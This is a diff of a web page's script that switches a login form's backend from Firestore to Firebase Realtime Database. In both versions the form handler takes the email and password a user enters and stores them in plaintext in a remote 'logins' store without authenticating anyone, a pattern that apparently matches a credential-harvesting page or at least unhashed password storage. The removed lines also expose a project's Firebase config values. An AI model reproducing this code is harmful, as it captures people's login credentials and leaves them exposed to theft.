@@ -135,42 +135,34 @@ button:hover{
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-database.js";
 
-// 🔴 YOUR FIREBASE CONFIG
 const firebaseConfig = {
-  apiKey: "AIzaSyBdCWsblLABbGDfpE1DxP1Fbkw7Qr-E0B4",
-  authDomain: "test-c1740.firebaseapp.com",
-  projectId: "test-c1740",
-  storageBucket: "test-c1740.firebasestorage.app",
-  messagingSenderId: "106270091671",
-  appId: "1:106270091671:web:bf61e9a3597aa9f9717cd2"
+  apiKey: "...",
+  authDomain: "...",
+  databaseURL: "YOUR_DATABASE_URL",
+  projectId: "...",
+  appId: "..."
 };
 
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const db = getDatabase(app);
 
-// FORM SUBMIT → SAVE TO FIREBASE
-document.getElementById("loginForm").addEventListener("submit", async (e) => {
-    e.preventDefault();
+document.getElementById("loginForm").addEventListener("submit", (e) => {
+  e.preventDefault();
 
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
 
-    try {
-        await addDoc(collection(db, "logins"), {
-            email: email,
-            password: password,
-            time: new Date()
-        });
+  const newRef = push(ref(db, "logins"));
 
-        alert("Saved to Firebase!");
-        document.getElementById("loginForm").reset();
+  set(newRef, {
+    email: email,
+    password: password,
+    time: new Date().toISOString()
+  });
 
-    } catch (error) {
-        console.error("Error:", error);
-        alert("Failed to save data");
-    }
+  alert("Saved to Realtime Database!");
 });
 </script>
 
